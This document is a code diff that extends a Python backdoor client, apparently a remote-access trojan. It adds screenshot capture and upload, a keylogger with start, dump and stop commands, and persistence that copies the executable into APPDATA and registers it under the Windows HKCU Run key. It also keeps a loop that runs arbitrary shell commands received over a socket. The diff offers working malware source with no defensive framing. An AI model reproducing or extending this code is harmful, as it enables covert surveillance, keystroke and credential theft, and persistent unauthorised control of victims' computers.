@@ -3,6 +3,11 @@ import time
 import subprocess
 import json
 import os
+import pyautogui
+import keylogger
+import threading
+import shutil
+import sys
 
 def reliable_send(data):
         jsondata = json.dumps(data)
@@ -16,9 +21,6 @@ def reliable_recv():
                         return json.loads(data)
                 except ValueError:
                         continue
-
-
-
 
 def connection():
 	while True:
@@ -49,6 +51,22 @@ def download_file(file_name):
         s.settimeout(None)
         f.close()
 
+def screenshot():
+    myScreenshot = pyautogui.screenshot()
+    myScreenshot.save('screen.png')
+
+def persist(reg_name, copy_name):
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
+        else:
+            reliable_send('[+] Persistence Already Exists')
+    except:
+        reliable_send('[+] Error Creating Persistence With The Target Machine')
+
 
 def shell():
 	while True:
@@ -63,6 +81,27 @@ def shell():
 			upload_file(command[9:])
 		elif command[:6] == 'upload':
 			download_file(command[7:])
+		elif command[:10] == 'screenshot':
+			screenshot()
+			upload_file('screen.png')
+			os.remove('screen.png')
+		elif command[:12] == 'keylog_start':
+			keylog = keylogger.Keylogger()
+			t = threading.Thread(target=keylog.start)
+			t.start()
+			reliable_send('[+] Keylogger Started!')
+		elif command[:11] == 'keylog_dump':
+			logs = keylog.read_logs()
+			reliable_send(logs)
+		elif command[:11] == 'keylog_stop':
+			keylog.self_destruct()
+			t.join()
+			reliable_send('[+] Keylogger Stopped!')
+		elif command[:11] == 'persistence':
+			reg_name, copy_name = command[12:].split(' ')
+			persist(reg_name, copy_name)
+		elif command[:7] == 'sendall':
+			subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
 		else:
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			result = execute.stdout.read() + execute.stderr.read()
